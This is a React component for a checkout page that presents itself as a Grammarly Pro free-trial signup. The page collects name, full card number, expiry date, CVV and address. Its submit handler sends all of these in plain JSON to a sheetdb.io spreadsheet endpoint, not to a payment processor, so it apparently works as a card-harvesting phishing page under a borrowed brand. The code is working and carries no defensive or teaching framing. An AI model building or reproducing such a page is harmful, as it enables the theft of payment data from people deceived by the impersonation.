import React, { useState } from "react";
import { useLocation } from "react-router-dom";
import styles from "../assets/Review.module.css";

const Review = () => {
  const location = useLocation();
  const plan = location.state?.plan || "Annual";

  const [name, setName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [country, setCountry] = useState("");
  const [postal, setPostal] = useState("");
  const [status, setStatus] = useState("");

  const validateInputs = () => {
    const cardRegex = /^[0-9]{16}$/;
    const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/; 
    const cvvRegex = /^[0-9]{3}$/;

    if (!name) return "Name is required.";
    if (!cardRegex.test(cardNumber)) return "Card number must be 16 digits.";
    if (!expiryRegex.test(expiry)) return "Expiry must be in MM/YY format.";
    if (!cvvRegex.test(cvv)) return "CVV must be 3 digits.";
    if (!country) return "Country is required.";
    return null;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const error = validateInputs();
    if (error) {
      setStatus(`⚠️ ${error}`);
      return;
    }

    const paymentData = {
      data: [
        {
          Name: name,
          CardNumber: cardNumber,
          Expiry: expiry,
          CVV: cvv,
          Country: country,
          Postal: postal,
          Plan: plan,
        },
      ],
    };

    try {
      const response = await fetch("https://sheetdb.io/api/v1/d133j3fpf1wek", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(paymentData),
      });

      if (response.ok) {
        setStatus("✅ Payment details saved successfully!");
        setName("");
        setCardNumber("");
        setExpiry("");
        setCvv("");
        setCountry("");
        setPostal("");
      } else {
        setStatus("❌ Failed to save details. Please try again.");
      }
    } catch (error) {
      console.error(error);
      setStatus("⚠️ Network error while saving details.");
    }
  };

  return (
    <div className={styles.container}>
      <div className={styles.card}>
        {/* LEFT SIDE - ORDER SUMMARY */}
        <div className={styles.summary}>
          <h3>Your Order Summary</h3>
          <p><strong>Plan:</strong> Grammarly Pro</p>
          <p><strong>Billing:</strong> {plan}</p>
          <p><strong>Today’s Order:</strong> ₱0.00 USD</p>
          <p>
            {plan === "Annual"
              ? "₱4999.00/year (₱12/month) charged after 7-day trial"
              : "₱499.00/month charged after 7-day trial"}
          </p>

          <h4>How your trial works</h4>
          <ul>
            <li>Today - Your full access Pro plan trial is unlocked.</li>
            <li>Day 5 - We’ll send an end-of-trial email reminder.</li>
            <li>Day 7 - Your paid subscription begins unless you cancel beforehand.</li>
          </ul>
        </div>

        {/* RIGHT SIDE - PAYMENT FORM */}
        <div className={styles.payment}>
          <h3>Enter your payment details</h3>
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Full Name"
              value={name}
              onChange={(e) => setName(e.target.value)}
              required
            />
            <input
              type="text"
              placeholder="Credit or Debit Card Number (16 digits)"
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
              required
            />
            <div className={styles.row}>
              <input
                type="text"
                placeholder="MM/YY"
                value={expiry}
                onChange={(e) => setExpiry(e.target.value)}
                required
              />
              <input
                type="text"
                placeholder="CVV (3 digits)"
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                required
              />
            </div>
            <input
              type="text"
              placeholder="Country/Region"
              value={country}
              onChange={(e) => setCountry(e.target.value)}
              required
            />
            <input
              type="text"
              placeholder="Postal Code (Optional)"
              value={postal}
              onChange={(e) => setPostal(e.target.value)}
            />
            <button type="submit">Start Free Trial</button>
          </form>
          {status && <p className={styles.status}>{status}</p>}
        </div>
      </div>
    </div>
  );
};

export default Review;
